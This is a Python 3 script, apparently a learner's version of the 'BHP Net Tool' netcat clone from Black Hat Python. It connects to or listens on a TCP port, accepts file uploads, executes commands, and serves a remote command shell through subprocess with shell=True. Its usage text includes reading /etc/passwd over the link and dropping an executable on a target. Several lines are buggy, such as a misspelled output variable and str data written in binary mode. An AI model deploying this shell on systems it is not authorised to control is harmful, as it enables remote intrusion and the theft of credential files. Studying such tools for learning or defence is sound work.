#!/usr/bin/python3

import sys
import socket
import getopt
import threading
import subprocess

#define the global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0
bufsiz = 0

def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen    -listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving connection")
    print("-c --command  -cinitialize a command shell")
    print("-u --upload=destination  -upon receiving connection upload a file and write to [destination]")
    print()
    print()
    print("Examples: ")
    print("python3 bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("python3 bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("python3 bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'abcdefghi' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    global bufsiz

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:b:", ["help", "listen", "execute", "target", "port", "command", "upload", "bufsiz"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-b", "--bufsiz"):
            bufsiz = int(a)
        else:
            assert False,"Unhandled Option"

    #are we going to listen or just send data frmo stdin?
    if not listen and len(target) and port>0:
        #read in the buufer from the commandline
        #this will block, so send CTRL-D if not sending input to stdin
        buffe = "dummy"

        #send data off
        client_sender(buffe)
    #we are going to listen and potntially upload things, exceute commands, and drop a shell back depending on our command line options above
    if listen:
        server_loop()


def client_sender(buffe):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((target, port))
       # print("Connected")
        while True:
            recv_len = 1
            response = ""

            while recv_len:

                data = client.recv(bufsiz)
                recv_len = len(data)
                print(data.decode('utf-8'), end = "")

                #wait for more input
                buffe = input("")
                buffe += "\n"
                client.send(buffe.encode())
                if (buffe == "exit\n"):
                    sys.exit(0)
    except Exception as err:
        print(err)
        print("[*] Exception! Exciting!")

        #tear down the coonection
        client.close()

def server_loop():
    global target

    #if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    client_socket, addr = server.accept()
   # print("Connection accpeted")
    #spin off a thread to handle our new client
    client_handler(client_socket)

def run_command(command):

    #trim the new line
    command = command.rstrip()

    #run the command and get the outptu back
    try:
        output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
    except:
        output = "Failed to execute the command .\r\n"

    #send the output back to the client.
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    #check for upload
    if len(upload_destination):

        #read in all of the bytes and write to our destination.
        file_buffer = ""

        #keep reading data untill none is availabe.
        while True:
            data = (client_socket.recv(bufsiz)).decode('utf-8')

            if not data:
                break
            else:
                file_buffer += data

        #now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #acknowledge that we wrote the file out
            client_socket.send(("Successfully saved file to %s \r\n" %(upload_destination)).encode())
        except:
            client_socket.send(("Failed to save file to %s \r\n" %(upload_destination)).encode())

    if len(execute):

        #run the command
        ouput = run_command(execute)

        client_socket.send(output)

    #now we go into another loop if a command shell was requested

    if command:
       # print("Sending")
        while True:
            #show a simplee prompt
            #a = "Its gonna start"
           # client_socket.send(a.encode())
            b = "<BHP:# "
            client_socket.send(b.encode())

            #now we receive untill we see a linefeed
            cmd_buffer = ""
           # print(cmd_buffer)

            while "\n" not in cmd_buffer:
                cmd_buffer = (client_socket.recv(bufsiz)).decode('utf-8')
            if (cmd_buffer == "exit\n"):
                sys.exit(0)
           # print(cmd_buffer)

            #send back the command output
            response = run_command(cmd_buffer)
            print(type(response))
            if (type(response) == bytes):
                print("should work")
            if (type(response) == str):
                print("Why isnt it working")
                response =response.encode()
            #send back the response
            client_socket.send(response)
           # print(response.decode('utf-8'))
main()
